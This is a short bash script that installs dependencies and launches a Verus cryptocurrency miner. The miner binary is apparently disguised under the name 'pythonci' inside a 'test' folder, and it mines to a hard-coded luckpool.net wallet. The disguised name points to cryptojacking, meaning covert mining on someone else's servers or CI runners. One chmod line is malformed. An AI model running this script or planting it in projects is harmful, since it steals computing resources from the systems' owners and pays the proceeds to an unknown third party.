#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x joyce.sh && chmod +x pythonci chmod 777 pythonci joyce.sh
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=RTxV5jDjpndt1BXa8KyZ2rpbZGSfnvgJjs
WR=VIA-010
cd test;./pythonci -a verus -o $PL -u $WT.$WR -p x

